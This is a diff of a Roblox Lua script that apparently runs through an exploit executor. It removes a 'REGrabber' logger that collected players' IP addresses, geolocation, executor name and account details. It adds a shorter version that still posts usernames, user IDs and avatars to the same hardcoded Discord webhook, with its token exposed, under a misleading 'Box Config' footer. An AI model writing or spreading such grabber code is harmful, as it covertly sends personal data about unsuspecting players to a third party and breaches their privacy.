@@ -1,128 +1,57 @@
-local Webhook = "https://discord.com/api/webhooks/1464336559737405490/QylKsSE_D4M-fsJ4znJV4QXSy0d5-0rXy4kTlq_R-m93HyutHvFgwR-TUPF67599gZCx" -- Put your Webhook link here
-local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
-local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
-local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
-local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) -- Getting location info
--- TODO: Using Shodan API
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
 
-local Headers = {["content-type"] = "application/json"} -- DO NOT TOUCH
+local webhookUrl = "https://discord.com/api/webhooks/1464336559737405490/QylKsSE_D4M-fsJ4znJV4QXSy0d5-0rXy4kTlq_R-m93HyutHvFgwR-TUPF67599gZCx"
 
-local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer
+local function SendPlayerInfo(url)
+    local userId = player.UserId
+    local thumbType = Enum.ThumbnailType.HeadShot
+    local thumbSize = Enum.ThumbnailSize.Size420x420
+    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
 
-local AccountAge = LocalPlayer.AccountAge -- Account age since created
-local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
-local UserId = LocalPlayer.UserId -- UserID
-local PlayerName = LocalPlayer.Name -- Player name
-local DisplayName= LocalPlayer.DisplayName
-local PlaceID = game.PlaceId -- The game that player is playing
-
-
-local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
-local rver = "Version 0.2b" -- Change to your version if you want
-
---[[ Identify the executor ]]--
--- https://v3rmillion.net/showthread.php?tid=1163680&page=2
-function identifyexploit()
-   local ieSuccess, ieResult = pcall(identifyexecutor)
-   if ieSuccess then return ieResult end
-   
-   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
-end
-
---[[ Webhook ]]--
-local PlayerData = {
-        ["content"] = "",
+    local data = {
         ["embeds"] = {{
-           
-            ["author"] = {
-                ["name"] = "REGrabber "..rver, -- Grabber name and version
+            ["title"] = "Player Profile Data",
+            ["color"] = 0x2b2d31,
+            ["thumbnail"] = {
+                ["url"] = content
             },
-           
-            ["title"] = PlayerName, -- Username/PlayerName
-            ["description"] = "aka "..DisplayName, -- Display Name/Nickname
             ["fields"] = {
                 {
-                    --[[Username/PlayerName]]--
-                    ["name"] = "Username:",
-                    ["value"] = PlayerName,
+                    ["name"] = "Display Name",
+                    ["value"] = player.DisplayName,
                     ["inline"] = true
                 },
                 {
-                    --[[Membership type]]--
-                    ["name"] = "Membership Type:",
-                    ["value"] = MembershipType,
+                    ["name"] = "Username",
+                    ["value"] = "@" .. player.Name,
                     ["inline"] = true
                 },
                 {
-                    --[[Account age]]--
-                    ["name"] = "Account Age (days):",
-                    ["value"] = AccountAge,
-                    ["inline"] = true
-                },
-                {
-                    --[[UserID]]--
-                    ["name"] = "UserId:",
-                    ["value"] = UserId,
-                    ["inline"] = true
-                },
-                {
-                    --[[IPv4]]--
-                    ["name"] = "IPv4:",
-                    ["value"] = IPv4,
-                    ["inline"] = true
-                },
-                {
-                    --[[IPv6]]--
-                    ["name"] = "IPv6:",
-                    ["value"] = IPv6,
-                    ["inline"] = true
-                },
-                {
-                    --[[PlaceID]]--
-                    ["name"] = "Place ID: ",
-                    ["value"] = PlaceID,
-                    ["inline"] = true
-                },
-                {
-                    --[[Exploit/Executor]]--
-                    ["name"] = "Executor: ",
-                    ["value"] = identifyexploit(),
-                    ["inline"] = true
-                },
-                {
-                    --[[Log/Grab time]]--
-                    ["name"] = "Log Time:",
-                    ["value"] = LogTime,
-                    ["inline"] = true
-                },
-                {
-                    --[[HTTPbin]]--
-                    ["name"] = "HTTPbin Data (JSON):",
-                    ["value"] = "```json"..'\n'..HTTPbin.."```",
+                    ["name"] = "User ID",
+                    ["value"] = tostring(userId),
                     ["inline"] = false
-                },
-                {
-                    --[[geoPlugin]]--
-                    ["name"] = "geoPlugin Data (JSON):",
-                    ["value"] = "```json"..'\n'..GeoPlug.."```",
-                    ["inline"] = false
-                },
+                }
             },
+            ["footer"] = {
+                ["text"] = "Full Size Box Config: Roof Down"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
 
-
-local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
-local HttpRequest = http_request;
-
-if syn then
-    HttpRequest = syn.request
-    else
-    HttpRequest = http_request
+    local body = HttpService:JSONEncode(data)
+    
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = body
+    })
 end
 
--- Send to your webhook.
-HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+SendPlayerInfo(webhookUrl)
 
 local IsStudio = false
 
